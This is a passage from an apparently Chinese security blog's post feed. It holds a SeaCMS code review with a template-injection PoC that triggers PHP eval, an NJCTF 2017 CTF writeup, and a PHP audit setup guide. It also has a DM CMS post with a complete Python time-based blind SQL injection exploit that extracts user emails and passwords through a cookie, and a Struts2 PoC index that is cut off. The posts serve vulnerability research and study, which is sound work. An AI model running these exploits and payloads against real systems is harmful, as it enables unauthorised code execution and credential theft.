class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">function parseIf($content)&#123;</span><br><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">return $content;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">$labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">$labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br><span class="line">$arlen=count($iar[0]);</span><br><span class="line">$elseIfFlag=false;</span><br><span class="line">for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">$strIf=$iar[1][$m];</span><br><span class="line">$strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">$strThen=$iar[2][$m];</span><br><span class="line">$strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">$elsearray=explode($labelRule3,$strThen);</span><br><span class="line">$strThen1=$elsearray[0];</span><br><span class="line">$strElse1=$elsearray[1];</span><br><span class="line">                    echo &quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;;</span><br><span class="line">                    eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$elseIfArray=explode($labelRule2,$strThen);</span><br><span class="line">$elseIfArrayLen=count($elseIfArray);</span><br><span class="line">$elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);</span><br><span class="line">$resultStr=$elseIfSubArray[1];</span><br><span class="line">$elseIfArraystr0=addslashes($elseIfArray[0]);</span><br><span class="line">@eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);</span><br><span class="line">for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;</span><br><span class="line">$strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIf=$this-&gt;parseStrIf($strElseIf);</span><br><span class="line">$strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);</span><br><span class="line">if ($elseIfFlag) &#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);</span><br><span class="line">$content=str_replace($iar[0][$m],$resultStr,$content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面主要逻辑为解析html文件中的{if:}{end if}标签代码，可以看到没有做任何处理就eval，那么我们查找一下对应调用的地方会不会有漏洞。<br>主要关注前台，找到一处解析搜索结果的页面（search.php），代码比较多，一点一点来看。<br>找到调用的位置line 212<code>$content=$mainClassObj-&gt;parseIf($content);</code><br>往上看，发现他的逻辑是先解析其他类型的标签，比如<code>{searchpage:page}</code><br>那么接下来的思路，主要是2点，查找对应if标签可控的位置，另一种就是查找其他标签的可控内容，写入if标签<br>我找到一处其他标签可控且没有做任何处理的位置，直接写入if标签语句即可造成任意代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function echoSearchPage()</span><br><span class="line">&#123;</span><br><span class="line">        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">        $order = !empty($order)?$order:time;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>order变量可控并且在调用parseIf函数前先解析，所以我们可以通过order写入if标签。<br>查看一下具体html代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;最近热播&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;评分最高&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>那么接下来就可以构造poc了，类似sql注入，我们先把前面的if标签语句闭合，写入恶意代码并闭合后面的if标签。<br>example：<code>}{end if}{if:1)phpinfo();if(1}{end if}</code><br>本地验证一下<br><img src="http://blog.0kami.cn/img/seacms/1.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是一个比较经典的漏洞，也可以被称为模版解析吧我觉得：）<br>ps: 后悔啊，没有先提交个poc平台T_T</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】NJCTF2017 writeup</title>
      <link href="/2017/03/15/old-njctf-2017/"/>
      <url>/2017/03/15/old-njctf-2017/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>辞职后没事情干，刚好赶上njctf，还是一样菜啊，只做了7道题，还要继续努力💪（ps:毕业设计什么鬼啊）写一下web的writeup，由于题目还开着，把没做出来的做一遍，纪录一下我觉得有必要记的题<br><a id="more"></a></p><h1 id="Web题"><a href="#Web题" class="headerlink" title="Web题"></a>Web题</h1><h3 id="Login（100）"><a href="#Login（100）" class="headerlink" title="Login（100）"></a>Login（100）</h3><p>好吧，这道题取了巧，谁让大黑客们都是弱密码呢！！！！<br>由于没有做验证码机制，所以扫了一波弱口令，然后…然后就进去啦<br>其实这道题考的是mysql的长度限制漏洞。利用2个mysql的特性</p><ol><li>当数据超过建表时的规定的数据大小，mysql将超过的部分截断</li><li>当select时where查询字句中的数据如果最后以空格结尾，mysql默认将空格去除查询<br>那么利用这2个特性，我们只要注册一个admin+N*%20+x就可以已admin登陆，然后getflag：NJCTF{4R3_Y0u_7H3_Re41_aDM1N?}</li></ol><h3 id="Get-Flag-100"><a href="#Get-Flag-100" class="headerlink" title="Get Flag(100)"></a>Get Flag(100)</h3><p>这道题考了命令执行漏洞<br>首先发现存在文件任意读取漏洞，那么尝试读取一下源码，最后试出来是app.py<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/1.png" alt=""><br>可以看到有个命令执行并且是可控的，但是过滤了一些字符，用&amp;就可以绕过。<br>ls 查看一下<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/2.png" alt=""><br>可以看到flag文件<br><code>9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</code><br>cat一波，这里的特殊字符转移是关键<br><img src="http://blog.0kami.cn/img/njctf_2017_3_13/3.png" alt=""></p><h3 id="come-on-200"><a href="#come-on-200" class="headerlink" title="come on(200)"></a>come on(200)</h3><p>具体看大佬们的writeup即可，这道题主要学到了其盲注的注入方式。<br>binary函数用来区分大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select xxx from xxx like x%</span><br><span class="line">select xxx from xxx like xx%</span><br><span class="line">select xxx from xxx like xxx%</span><br><span class="line">select xxx from xxx like xxxx%</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过like来住出数据</p><h3 id="Be-Admin-300"><a href="#Be-Admin-300" class="headerlink" title="Be Admin(300)"></a>Be Admin(300)</h3><p>首先发现有.bak文件，下下来看一下,发现这道题主要考的是cbc字节翻转攻击和padding oracle attack.<br>首先由于登陆出存在注入，我们可以把数据中的encrypt_pass取出来<br>登陆绕过可以通过php弱类型比较来绕过，admin／0即可登陆<br>要通过cbc字节翻转必须知道defaultId的值，所以我们需要先跑出defaultId的值<br>padding oracle attack参考<a href="http://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">padding oracle attack</a><br>符合我们现在的情况：</p><ol><li>已知真实IV</li><li>已知对应cipher text</li><li>当解密失败ERROR错误<br>题目环境可能坏了，本地搭一下，跑一下中间值<br>需要注意的一点是padding oracle attack第一个字符没办法跑出来，由于最后一个字符解出来是空白所以还是error，不过没关系暴力一遍就好了（ps：有了原理，写代码很容易，就不放代码了）</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>欠缺的还是很多，继续💪</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> njctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OTHERS】php代码审计前的准备</title>
      <link href="/2017/02/03/old-code-review-pre-prepare/"/>
      <url>/2017/02/03/old-code-review-pre-prepare/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>所谓“工欲善其事,必先利其器”，在代码审计前，我们需要准备提高我们审计效率的工具。</p><a id="more"></a><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>Mac</li><li>xampp(可以用phpstudy或者是其他集成环境代替)</li><li>Navicat Premium(个人认为Mac下最好的数据库管理工具，学生党只能用**,有能力尽量支持正版)</li><li>phpstorm(这里的IDE用的是我自己比较习惯的，也可以使用其他你比较熟悉的)</li><li>xdebug(用来动态调试)</li><li>终端</li><li>浏览器(firefox、chrome,这里使用firefox,hackbar是个好东西)</li></ol><p>安装上述的软件之类的就不说了，下文主要是动态调试环境搭建。</p><h1 id="动态调试环境"><a href="#动态调试环境" class="headerlink" title="动态调试环境"></a>动态调试环境</h1><h2 id="php添加xdebug配置"><a href="#php添加xdebug配置" class="headerlink" title="php添加xdebug配置"></a>php添加xdebug配置</h2><p>xampp的php.ini位于<code>/install/path/etc/php.ini</code>，在配置文件最后添加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_enable=on</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_mode=&quot;req&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_host=localhost/127.0.0.1</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure><p>so文件是xampp自带的，mac下的配置可以直接copy我的<br>保存后重启apache</p><h2 id="firefox安装xdebug扩展"><a href="#firefox安装xdebug扩展" class="headerlink" title="firefox安装xdebug扩展"></a>firefox安装xdebug扩展</h2><p>firefox下的xdebug扩展叫 the easiest xdebug，搜索一下安装<br>安装完成后点亮工具栏上的甲虫，开启调试<br><img src="../../../../img/pre_code_review/bug.png" alt=""><br>设置key,更php配置文件中相同<br><img src="../../../../img/pre_code_review/bug2.png" alt=""></p><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>打开Preferences-&gt;Languages&amp;Framework-&gt;php<br><img src="../../../../img/pre_code_review/step1.png" alt=""><br>如图设置servers，接着设置debug下的DBGp Proxy<br><img src="../../../../img/pre_code_review/step2.png" alt=""><br>设置完成后在工具栏处找到edit Configurations<br><img src="../../../../img/pre_code_review/step3.png" alt=""><br>新增php web application<br><img src="../../../../img/pre_code_review/step4.png" alt=""><br>接下来就可以愉快的下断点，动态调试了</p><h1 id="mysql执行审计监控"><a href="#mysql执行审计监控" class="headerlink" title="mysql执行审计监控"></a>mysql执行审计监控</h1><p>在navicat或终端中运行以下2句</p><blockquote><p>set global general_log=on;<br>set global log_output=’table’;</p></blockquote><p>查看mysql.general_log表可以看到运行过的sql语句，方便我们查询<br>win下可以用seay的代码审计工具，带了mysql的sql监控</p><h1 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h1><p>终端主要用到了grep这个工具，网上有很多相关的教材。<br>主要匹配输入输出点，危险函数等等<br>具体的以后有空了再补充</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>记录一下过程，以后能看看，愉快的代码审计吧:P</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Code Review】DM企业建站系统前台盲注</title>
      <link href="/2017/01/29/old-DM-sql-injection/"/>
      <url>/2017/01/29/old-DM-sql-injection/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>今天搞了一下动态调试的东西，然后顺便看了看上次下的<a href="http://www.demososo.com/down.html" target="_blank" rel="noopener">DM企业建站系统2017.01.23</a>。</p><a id="more"></a><h1 id="前台cookie-时间盲注"><a href="#前台cookie-时间盲注" class="headerlink" title="前台cookie 时间盲注"></a>前台cookie 时间盲注</h1><p>大致跟了一下几个入口文件，该套cms主要的安全措施为<code>htmlentities</code>，在POST&amp;&amp;GET的输入点做了html实体化的操作，但是这并不转义单引号（默认不转义单引号具体可看<a href="http://www.php.net/manual/en/function.htmlentities.php" target="_blank" rel="noopener">htmlentities</a>），看了一下进行数据库查询的sql语句，涉及到字符串类型时，都是单引号闭合，那么很清楚，在进行数据库查询时容易产生sql注入漏洞。<br>那么接下来主要找一下进行数据库操作的位置。</p><ol><li>POST&amp;&amp;GET</li><li>COOKIE </li></ol><p>ps：这里就随便找了一个地方，因为这套系统注入不要太多，连后台登陆都可以 :P</p><p>前面提到对POST&amp;&amp;GET做了实体转义，但是grep找了一下cookie，发现并没有对cookie的值进行安全操作，直接带入数据库查询。<br>indexDM_load.php Line 108</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) </span><br><span class="line">    $curstyle = $_COOKIE[&quot;curstyle&quot;];</span><br><span class="line">else </span><br><span class="line">    $curstyle = $row[&apos;curstyle&apos;];</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; </span><br><span class="line"> //echo $sqlstyle;exit;</span><br><span class="line">if(getnum($sqlstyle)&gt;0)&#123;</span><br><span class="line">$rowstyle = getrow($sqlstyle);</span><br></pre></td></tr></table></figure><p>上述为漏洞的主要成因点，如果cookie中存在curstyle,优先选用cookie中的值，然后带入数据库查询。由于没有找到具体回显数据的地方，所以采用时间盲注的方式获取数据。</p><p>带上自己写的EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2017/1/30</span><br><span class="line"></span><br><span class="line">import requests,time</span><br><span class="line"></span><br><span class="line">class CookieBlindSqlInjection:</span><br><span class="line"></span><br><span class="line">    def __init__(self,url):</span><br><span class="line">        self.url=url</span><br><span class="line">        self.len=0</span><br><span class="line"></span><br><span class="line">    def getLength(self,column,table):</span><br><span class="line">        payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        #first confirm bin-format data length</span><br><span class="line">        len=0</span><br><span class="line">        for i in range(1,9):</span><br><span class="line">            cookie=payload0.format(column=column,table=table,line_start=0,flag=i)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            if flag==&quot;0&quot;:</span><br><span class="line">                len=i</span><br><span class="line">                break</span><br><span class="line">        res=&quot;&quot;</span><br><span class="line">        for i in range(1,len+1):</span><br><span class="line">            cookie=payload1.format(column=column,col_start=i,table=table,line_start=0)</span><br><span class="line">            flag=self.send(cookie)</span><br><span class="line">            res+=flag</span><br><span class="line">            # print res</span><br><span class="line">        self.len=int(res,2)</span><br><span class="line">        pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len))</span><br><span class="line">        return int(res,2)</span><br><span class="line"></span><br><span class="line">    def getData(self,column,table):</span><br><span class="line">        payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot;</span><br><span class="line">        payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot;</span><br><span class="line">        total_res=&quot;&quot;</span><br><span class="line">        for i in range(1,self.len+1):#具体数据的长度</span><br><span class="line">            len = 0</span><br><span class="line">            for j in range(1, 9):</span><br><span class="line">                cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                if flag == &quot;0&quot;:</span><br><span class="line">                    len = j</span><br><span class="line">                    break</span><br><span class="line">            # print &quot;len:&quot;+str(len)</span><br><span class="line">            res = &quot;&quot;</span><br><span class="line">            for k in range(1, len + 1):</span><br><span class="line">                cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0)</span><br><span class="line">                flag = self.send(cookie)</span><br><span class="line">                res += flag</span><br><span class="line">                # print res</span><br><span class="line">            total_res+=chr(int(res,2))</span><br><span class="line">            pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res)</span><br><span class="line">        return total_res</span><br><span class="line"></span><br><span class="line">    def send(self,cookie):</span><br><span class="line">        headers=&#123;&quot;Cookie&quot;:cookie&#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(self.url, headers=headers,timeout=4)</span><br><span class="line">            return &quot;1&quot;</span><br><span class="line">        except:</span><br><span class="line">            return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">def pprint(flag,content):</span><br><span class="line">    print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \</span><br><span class="line">        .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;)</span><br><span class="line">    pprint(&quot;*&quot;,&quot;program start&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;)</span><br><span class="line">    cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps)</span><br><span class="line">    pprint(&quot;*&quot;, &quot;program done&quot;)</span><br></pre></td></tr></table></figure><p>ps:DM这个鬼，代码写的好乱啊T_T</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VULNERABLITY】Struts2命令执行各版本记录</title>
      <link href="/2017/01/13/old-Struts2-history-payload/"/>
      <url>/2017/01/13/old-Struts2-history-payload/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏</p><a id="more"></a><ul><li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></li><li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-xxx" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-xxx</a></li><li><a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-009</a></li></ul><h1 id="Struts2命令执行集合"><a href="#Struts2命令执行集合" class="headerlink" title="Struts2命令执行集合"></a>Struts2命令执行集合</h1><p>下文不是具体的分析文，能力有限，仅记录一下以做将来复习查用。<br>过段时间会将所有的漏洞环境上传到github上，环境来源大部分为我偶像<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>博客上共享的以及官网上下的对应版本的示例环境。<br>update:2017/1/16 <a href="https://github.com/0kami/Struts2Environment/" target="_blank" rel="noopener">环境地址</a></p><h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><pre><code>影响版本：2.0.0 - 2.0.8具体详情：https://struts.apache.org/docs/s2-001.html</code></pre><blockquote><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p></blockquote><p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>的描述。</p><h3 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取tomcat执行路径"><a href="#获取tomcat执行路径" class="headerlink" 